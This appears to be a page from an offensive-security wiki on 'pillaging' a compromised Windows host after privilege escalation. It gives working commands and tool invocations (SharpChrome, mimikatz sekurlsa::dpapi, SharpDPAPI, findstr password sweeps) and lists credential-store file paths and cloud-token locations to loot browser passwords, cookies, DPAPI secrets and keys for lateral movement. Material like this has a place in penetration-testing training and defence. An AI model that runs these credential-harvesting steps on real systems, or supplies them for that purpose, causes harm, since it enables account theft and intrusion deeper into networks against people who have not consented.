# Pillaging

Pillaging is the post-escalation sweep for anything of value on a compromised host — credentials, keys, tokens, sensitive documents, and pivot information. It is what you do *after* reaching SYSTEM (or in parallel with escalation): mine the applications and user profiles for secrets that unlock the next host or the domain. Windows privilege escalation rarely ends at one box, and pillaging is how one foothold becomes many.

## Browser credentials and cookies

Saved logins, cookies, and history often yield working credentials and session tokens:

```text
# Chromium/Edge/Firefox — decrypt saved logins & cookies (run in user context)
SharpChrome logins
SharpChrome cookies
```

The relevant files (encrypted with DPAPI under the user):

```text
%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data
%APPDATA%\Mozilla\Firefox\Profiles\*\logins.json
```

## Password managers, config files, and notes

```cmd
where /r C:\Users *.kdbx *.ppk *.rdp *.ovpn *.config unattend.xml
findstr /si password *.txt *.ini *.xml *.config
```

See [Password Mining](Password-Mining/Password-Mining.md) for the fuller set (registry, ADS, VHDs, web.config, sticky notes).

## DPAPI secrets, credentials, and tokens

```text
# Windows Credential Manager / DPAPI (mimikatz / SharpDPAPI)
cmdkey /list
mimikatz # sekurlsa::dpapi
SharpDPAPI.exe triage
```

## Application & infrastructure loot

- SSH/PuTTY keys (`.ppk`), cloud CLI tokens (`%USERPROFILE%\.aws`, `.azure`), Kubernetes configs.
- Saved RDP/VPN profiles, database connection strings, script/CI credentials.
- Email (`.pst`), KeePass DBs, and any `*.bak`/`*.old` config copies.

## After pillaging

Feed what you find into lateral movement and domain escalation:

## Related
- [Windows Privilege Escalation](README.md) — category MOC
- [Password Mining](Password-Mining/Password-Mining.md) — systematic on-host credential discovery
- [LSASS Credential Dumping](Password-Mining/LSASS-Credential-Dumping.md) — live credentials from memory
- [Interacting with Users](Interacting-with-Users.md) — capturing secrets from active users
- Pass The Hash Attack · Offensive Active Directory — using the loot to pivot
